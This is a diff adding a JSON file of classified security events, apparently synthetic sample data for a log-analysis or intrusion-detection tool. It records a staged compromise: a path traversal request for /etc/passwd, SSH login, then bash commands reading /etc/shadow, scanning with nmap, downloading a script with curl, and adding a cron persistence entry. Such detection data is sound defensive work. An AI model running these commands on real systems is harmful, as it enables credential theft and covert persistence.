@@ -1,0 +1,401 @@
+{
+    "events": [
+        {
+            "event_id": "WEB-00001",
+            "timestamp": "2026-10-06T13:10:01+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:01 +0000] \"GET / HTTP/1.1\" 200 512",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 512,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00002",
+            "timestamp": "2026-10-06T13:10:04+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:04 +0000] \"GET /robots.txt HTTP/1.1\" 200 128",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/robots.txt",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 128,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00003",
+            "timestamp": "2026-10-06T13:10:09+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:09 +0000] \"GET /admin HTTP/1.1\" 403 210",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/admin",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 403,
+                "response_size": 210,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00004",
+            "timestamp": "2026-10-06T13:10:15+00:00",
+            "source": "web_access",
+            "event_type": "WEB_PATH_TRAVERSAL",
+            "message": "Potential path traversal attempt",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:15 +0000] \"GET /../../etc/passwd HTTP/1.1\" 400 190",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/../../etc/passwd",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 400,
+                "response_size": 190,
+                "referer": "",
+                "user_agent": "",
+                "classification": "WEB_PATH_TRAVERSAL"
+            }
+        },
+        {
+            "event_id": "WEB-00005",
+            "timestamp": "2026-10-06T13:10:21+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:21 +0000] \"POST /upload HTTP/1.1\" 201 340",
+            "metadata": {
+                "http_method": "POST",
+                "http_path": "/upload",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 201,
+                "response_size": 340,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00006",
+            "timestamp": "2026-10-06T13:10:30+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:30 +0000] \"GET /uploads/update.sh HTTP/1.1\" 200 901",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/uploads/update.sh",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 901,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "AUTH-00001",
+            "timestamp": "2026-10-06T13:11:02+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "wwwadmin",
+            "source_ip": "198.51.100.77",
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:02 server sshd[5101]: Accepted password for wwwadmin from 198.51.100.77 port 45555 ssh2",
+            "metadata": {
+                "port": 45555,
+                "authentication": "password",
+                "result": "success"
+            }
+        },
+        {
+            "event_id": "AUTH-00002",
+            "timestamp": "2026-10-06T13:11:03+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_SESSION_OPEN",
+            "message": "SSH session opened",
+            "user": "wwwadmin",
+            "source_ip": null,
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:03 server sshd[5101]: pam_unix(sshd:session): session opened for user wwwadmin",
+            "metadata": {
+                "session_state": "opened"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00001",
+            "timestamp": "2026-10-06T13:11:15+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_STARTED",
+            "message": "System service started",
+            "user": null,
+            "source_ip": null,
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:15 server systemd[1]: Started suspicious service process",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_STARTED",
+                "service": "suspicious service process"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00002",
+            "timestamp": "2026-10-06T13:11:21+00:00",
+            "source": "syslog",
+            "event_type": "KERNEL_EVENT",
+            "message": "Kernel-generated system event",
+            "user": null,
+            "source_ip": null,
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:21 server kernel: audit: web process spawned shell",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "KERNEL_EVENT"
+            }
+        },
+        {
+            "event_id": "BASH-00001",
+            "timestamp": "2026-10-06T20:17:15.750904+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "whoami",
+            "severity": "INFO",
+            "raw": "whoami",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00002",
+            "timestamp": "2026-10-06T20:17:15.750945+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "id",
+            "severity": "INFO",
+            "raw": "id",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00003",
+            "timestamp": "2026-10-06T20:17:15.750958+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/passwd",
+            "severity": "HIGH",
+            "raw": "cat /etc/passwd",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00004",
+            "timestamp": "2026-10-06T20:17:15.750971+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/shadow",
+            "severity": "HIGH",
+            "raw": "cat /etc/shadow",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00005",
+            "timestamp": "2026-10-06T20:17:15.750982+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "severity": "MEDIUM",
+            "raw": "nmap -sV 192.0.2.0/24",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00006",
+            "timestamp": "2026-10-06T20:17:15.750997+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "ss -tulpn",
+            "severity": "MEDIUM",
+            "raw": "ss -tulpn",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00007",
+            "timestamp": "2026-10-06T20:17:15.751006+00:00",
+            "source": "bash_history",
+            "event_type": "DOWNLOAD",
+            "message": "Potential remote file download",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "severity": "MEDIUM",
+            "raw": "curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "DOWNLOAD"
+            }
+        },
+        {
+            "event_id": "BASH-00008",
+            "timestamp": "2026-10-06T20:17:15.751034+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "chmod +x /tmp/update.sh",
+            "severity": "INFO",
+            "raw": "chmod +x /tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00009",
+            "timestamp": "2026-10-06T20:17:15.751052+00:00",
+            "source": "bash_history",
+            "event_type": "PERSISTENCE",
+            "message": "Potential persistence-related command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "crontab -e",
+            "severity": "HIGH",
+            "raw": "crontab -e",
+            "metadata": {
+                "shell": "bash",
+                "classification": "PERSISTENCE"
+            }
+        },
+        {
+            "event_id": "BASH-00010",
+            "timestamp": "2026-10-06T20:17:15.751060+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+            "severity": "INFO",
+            "raw": "echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        }
+    ]
+}
